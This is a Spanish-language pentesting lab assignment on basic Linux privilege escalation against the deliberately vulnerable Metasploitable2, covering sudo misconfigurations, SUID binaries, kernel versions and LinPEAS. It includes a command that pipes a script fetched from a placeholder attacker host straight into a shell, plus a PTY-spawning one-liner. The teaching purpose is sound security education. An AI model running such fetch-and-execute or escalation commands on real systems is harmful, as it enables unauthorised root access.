# Laboratorio 06 · Escalada de privilegios básica en Linux

## 🎯 Objetivo

Ya tienes acceso a la máquina (Laboratorio 04) como un usuario normal. Ahora toca ver si puedes convertirte en `root`. Este paso se llama **escalada de privilegios** (privilege escalation, o "privesc") y es casi siempre necesario en una explotación real, porque el primer acceso raramente es con permisos de administrador.

## 🧪 Entorno necesario

- Una shell en Metasploitable2 como usuario normal (puedes reutilizar la del Laboratorio 04, o simplemente hacer `ssh msfadmin@192.168.56.X` con la contraseña conocida `msfadmin`).

## 📖 Qué buscar y por qué funciona

Escalar privilegios en Linux consiste en encontrar alguna mala configuración que te permita ejecutar algo *como* root, aunque tú no lo seas. Las tres fuentes más comunes son:

### 1. Permisos `sudo` mal configurados

```bash
sudo -l
```
- Te lista qué comandos puedes ejecutar con `sudo` **sin que te pida contraseña**, si los hay. Si ves algo como `(root) NOPASSWD: /usr/bin/algo`, y ese "algo" es un programa que te permite ejecutar comandos arbitrarios (por ejemplo, un editor de texto como `vim`, o `find`), puedes usarlo para conseguir una shell como root.
- [GTFOBins](https://gtfobins.github.io) es una web de referencia que lista, para cada binario común, cómo abusar de él si tienes permisos de `sudo` sobre él. Búscalo ahí si encuentras algo en tu `sudo -l`.

### 2. El bit SUID en binarios

```bash
find / -perm -4000 -type f 2>/dev/null
```
- `-perm -4000`: busca ficheros con el bit **SUID** activado — significa que el programa se ejecuta siempre con los permisos de *quien lo creó* (el dueño del fichero), no de quien lo lanza. Si un binario con SUID pertenece a root y tiene algún comportamiento que puedas manipular, puedes acabar ejecutando código como root.
- `2>/dev/null`: descarta los mensajes de error (de carpetas a las que no tienes acceso) para que la salida sea legible.
- Igual que con `sudo`, [GTFOBins](https://gtfobins.github.io) también documenta qué binarios con SUID son explotables y cómo.

### 3. Kernel o software desactualizado con exploit conocido

```bash
uname -a
```
- Te da la versión exacta del kernel. Versiones antiguas a veces tienen vulnerabilidades públicas conocidas (CVE) que permiten escalar privilegios directamente, sin depender de una mala configuración.
- Esta vía es más compleja (normalmente implica compilar o ejecutar un exploit específico) — en este laboratorio basta con que identifiques la versión y confirmes si existe un exploit conocido para ella, sin necesidad de lanzarlo.

### Scripts que automatizan la búsqueda

```bash
curl http://TU_IP_KALI:8000/linpeas.sh | sh
```
- **LinPEAS** es un script que recorre automáticamente la máquina buscando las tres cosas de arriba (y muchas más) y te las resume con colores según lo prometedoras que sean.
- Para usarlo necesitas descargarlo primero en tu Kali, levantar un servidor HTTP simple ahí (`python3 -m http.server 8000` en la carpeta donde esté el script) y, desde la máquina víctima, descargarlo con `curl` o `wget` y ejecutarlo. Esto simula cómo en un caso real transferirías herramientas a una máquina a la que acabas de entrar.

## 🪜 Pasos a seguir

1. Conéctate a Metasploitable como `msfadmin`.
2. Ejecuta `sudo -l` y anota el resultado.
3. Busca binarios SUID con el comando de arriba.
4. Mira la versión del kernel con `uname -a`.
5. Descarga y ejecuta LinPEAS siguiendo el método del servidor HTTP explicado arriba.
6. En tu `writeup.md`, documenta qué vía de escalada encontraste (si encontraste alguna), por qué funciona, y si llegaste a conseguir una shell como root.

## 💡 Pistas si te atascas

- Metasploitable2 es una máquina deliberadamente vulnerable con varias vías de privesc "de manual" — si `sudo -l` no da nada interesante, revisa bien el resultado de LinPEAS, suele señalar el camino directamente.
- Si no consigues levantar el servidor HTTP en Kali, también puedes copiar el contenido de `linpeas.sh` directamente (es un script de texto) y pegarlo en un fichero nuevo dentro de la víctima con un editor como `nano`.

## 🚀 Reto extra

- Una vez tengas root, investiga la diferencia entre una shell *interactiva* completa y la shell limitada que a veces da un exploit — busca qué es un "TTY upgrade" (`python3 -c 'import pty;pty.spawn("/bin/bash")'`) y por qué se suele hacer nada más conseguir acceso inicial.
